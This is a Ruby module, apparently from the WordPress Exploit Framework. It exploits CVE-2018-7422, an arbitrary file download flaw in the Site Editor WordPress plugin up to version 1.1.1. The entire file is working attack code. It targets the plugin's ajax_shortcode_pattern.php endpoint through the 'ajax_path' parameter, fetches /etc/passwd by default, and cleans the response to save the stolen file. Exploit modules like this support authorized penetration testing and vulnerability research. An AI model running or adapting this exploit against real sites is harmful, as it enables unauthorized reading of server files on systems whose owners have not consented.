# frozen_string_literal: true

class Wpxf::Auxiliary::SiteEditorFileDownload < Wpxf::Module
  include Wpxf::WordPress::FileDownload

  def initialize
    super

    update_info(
      name: 'Site Editor <= 1.1.1 File Download',
      desc: %(
        This module exploits a vulnerability which allows you to
        download any non-PHP file accessible by the user the
        web server is running as.
      ),
      author: [
        'Nicolas Buzy-Debat', # Disclosure
        'rastating'           # WPXF module
      ],
      references: [
        ['CVE', '2018-7422'],
        ['WPVDB', '9044']
      ],
      date: 'Mar 16 2018'
    )
  end

  def check
    check_plugin_version_from_readme('site-editor', '1.1.2')
  end

  def default_remote_file_path
    '/etc/passwd'
  end

  def working_directory
    'wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/'
  end

  def downloader_url
    normalize_uri(wordpress_url_plugins, 'site-editor', 'editor', 'extensions', 'pagebuilder', 'includes', 'ajax_shortcode_pattern.php')
  end

  def validate_content(content)
    pattern = /{"success":true,"data":{"output":\[\]}}$/
    File.write(downloaded_filename, content.gsub(pattern, ''))
    super
  end

  def download_request_params
    { 'ajax_path' => remote_file }
  end
end
